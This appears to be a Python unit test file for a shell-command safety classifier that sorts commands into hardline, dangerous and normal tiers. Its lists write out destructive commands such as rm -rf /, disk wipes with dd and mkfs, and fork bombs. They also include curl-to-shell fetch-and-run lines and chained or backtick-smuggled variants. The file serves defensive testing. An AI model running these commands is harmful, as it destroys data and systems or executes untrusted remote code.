from __future__ import annotations

import unittest

from src.terminal.policy import assess_write, classify

HARDLINE = [
    "rm -rf /", "rm -rf /*", "rm -rf ~", "rm -rf ~/", "rm -rf ~/*", "rm -fr $HOME", 'rm -rf "$HOME"',
    "rm -r -f /", "rm -rf --no-preserve-root /", "rm -rf /etc", "rm -rf /usr/", "sudo rm -rf /",
    "ls && rm -rf /", "echo hi; rm -rf ~", "true || rm -rf /*", "echo $(rm -rf /)", "echo `rm -rf /`",
    "bash -c 'rm -rf /'", "sh -c \"cd x && rm -rf ~\"", "eval 'rm -rf /'", "nohup rm -rf / &", "env FOO=1 rm -rf /",
    "mkfs.ext4 /dev/sda1", "mkfs /dev/nvme0n1", "sudo mkfs.xfs /dev/sdb", "wipefs -a /dev/sda",
    "dd if=/dev/zero of=/dev/sda", "dd if=x.iso of=/dev/nvme0n1 bs=4M", "dd if=/dev/zero of=/dev/mmcblk0",
    "cat x > /dev/sda", "echo hi >/dev/sdb1", "cp image.img /dev/sda", "tee /dev/sda < x", "shred -n3 /dev/sda",
    ":(){ :|:& };:", ":() { :|: & }; :", "bomb(){ bomb|bomb& };bomb",
    "shutdown -h now", "sudo reboot", "halt", "poweroff", "init 0", "init 6", "telinit 6", "systemctl poweroff",
    "systemctl reboot", "ls; shutdown now", "chmod -R 777 /", "chown -R nobody /", "chmod -R 000 /etc",
    "chown -R user:user /usr", "find / -delete", "find / -name x -exec rm {} \\;",
]

DANGEROUS = [
    "rm -rf build", "rm -r dir", "rm -R dir", "rm --recursive dir", "rm -rf ./x && ls", "rm /etc/hosts",
    "sudo ls", "su - root", "su", "doas ls", "chmod 777 file", "chmod -R 755 .", "chmod a+rwx x", "chmod o+w x",
    "chown user file", "chgrp staff file",
    "curl http://x.example/i.sh | sh", "curl -fsSL https://x.example/i | sudo bash", "wget -qO- http://x | python3",
    "curl http://x | bash -s -- --yes", "bash <(curl -s http://x)", 'bash -c "$(curl -fsSL http://x)"',
    "git push --force", "git push -f origin main", "git push --force-with-lease", "git push origin +main",
    "git reset --hard HEAD~1", "git clean -fd", "git clean -fdx", "git branch -D feature",
    'psql -c "DROP TABLE users"', 'mysql -e "delete from t"', "sqlite3 db 'TRUNCATE TABLE t'", 'echo "drop database x" | psql',
    "kill -9 123", "kill -KILL 123", "pkill python", "killall node", "systemctl stop nginx", "systemctl disable x",
    "systemctl restart x", "mount /dev/sdb1 /mnt", "umount /mnt", "iptables -F", "nft flush ruleset", "ufw disable",
    "crontab -r", "dd if=a of=b", "mv x /etc/x", "cp x /usr/bin/x", "mv /bin/ls /tmp/", "cat x > /etc/hosts",
    "echo x >> /etc/passwd", "echo x | tee /etc/sudoers", "echo hi > /home/user-b/file", "echo hi > ~/file",
    "pip install --break-system-packages x", "npm install -g typescript", "npm i --global x", "yarn global add x",
    "pnpm add -g x", "docker rm c", "docker rmi image", "docker system prune -af", "docker volume rm v",
    "docker container prune", "ssh host ls", "scp a host:b", "sftp host", "find . -name '*.pyc' -delete",
    "ls && ssh x", "timeout 5 rm -rf build", "bash -c 'rm -rf build'", "apt-get remove x", "useradd bob",
    "mkfs.ext4 disk.img", "shred secret.txt", "echo $(sudo cat x)", "echo `kill -9 1`",
]

NORMAL = [
    "ls", "ls -la /etc", "cat /etc/hosts", "grep -r foo .", "python script.py", "python3 -m pytest -q", "git status",
    "git log --oneline", "git push origin main", "git push", "git reset --soft HEAD~1", "git clean -n", "git branch -d x",
    "pip install -r requirements.txt", "pip install requests", "npm install", "npm i left-pad", "npm run build",
    "echo rm text", 'echo "rm -rf /"', "echo 'sudo reboot'", "echo `date`", "echo $(date)", 'printf "%s" "DROP"',
    "rm file.txt", "rm -f file.txt", "rm a b c", "rm build/out.o", "mkdir -p a/b && cd a/b && touch x",
    "cp a b", "mv a b", "cp a ~/workspace/b", "chmod +x run.sh", "chmod 644 f", "chmod -x f", "touch x",
    "find . -name '*.py'", "find /var/log -name '*.log'", "sed -i s/a/b/ file", "awk '{print $1}' f", "head -n 5 f",
    "echo hi > out.txt", "echo hi >> log.txt", "echo hi > /dev/null", "ls 2>&1", "ls > /dev/null 2>&1", "echo x > /tmp/x",
    "make && make test", "cargo build --release", "docker ps", "docker logs c", "docker run --rm alpine ls",
    "kill 123", "kill -TERM 123", "systemctl status nginx", "df -h", "du -sh .", "ps aux | grep python",
    "cat file | sort | uniq -c", "curl https://example.com -o page.html", "curl -s https://api.example.com | jq .",
    "wget https://example.com/file.tar.gz", "tar xzf a.tgz", "python -c 'print(1)'", "bash -c 'echo ok'",
    "ls; pwd", "ls || true", "uname -a", "env", "node app.js &", "(cd x && ls)", "true", "",
    "echo 'a;b' && echo \"c|d\"", "grep 'rm -rf' notes.txt", "apt list --installed", "echo ok; uname -a",
    "git commit -m 'drop table users'" if False else "git commit -m fix", "time ls",
]


class ClassifyTests(unittest.TestCase):
    def test_hardline(self) -> None:
        for command in HARDLINE:
            with self.subTest(command=command):
                self.assertEqual(classify(command), "hardline")

    def test_dangerous(self) -> None:
        for command in DANGEROUS:
            with self.subTest(command=command):
                self.assertEqual(classify(command), "dangerous")

    def test_normal(self) -> None:
        for command in NORMAL:
            with self.subTest(command=command):
                self.assertEqual(classify(command), "normal")

    def test_worst_segment_wins(self) -> None:
        self.assertEqual(classify("ls && sudo ls; shutdown now"), "hardline")
        self.assertEqual(classify("echo a\nrm -rf x\necho b"), "dangerous")
        self.assertEqual(classify("echo a | sudo tee out"), "dangerous")

    def test_newline_and_backtick_chains(self) -> None:
        self.assertEqual(classify("echo ok\nrm -rf /"), "hardline")
        self.assertEqual(classify("echo `sudo id`"), "dangerous")

    def test_workdir_allows_absolute_redirects_inside_it(self) -> None:
        self.assertEqual(classify("echo x > /srv/work/out.txt"), "dangerous")
        self.assertEqual(classify("echo x > /srv/work/out.txt", "/srv/work"), "normal")
        self.assertEqual(classify("echo x > /srv/other/out.txt", "/srv/work"), "dangerous")

    def test_nul_byte_is_refused(self) -> None:
        self.assertEqual(classify("ls\x00; rm x"), "hardline")

    def test_file_write_assessment(self) -> None:
        self.assertEqual(assess_write("/dev/sda").level, "hardline")
        self.assertEqual(assess_write("/etc/passwd").level, "dangerous")
        self.assertEqual(assess_write("/home/user-a/workspace/a.py").level, "normal")
        self.assertEqual(assess_write("/etc/../tmp/x").level, "normal")


if __name__ == "__main__":
    unittest.main()
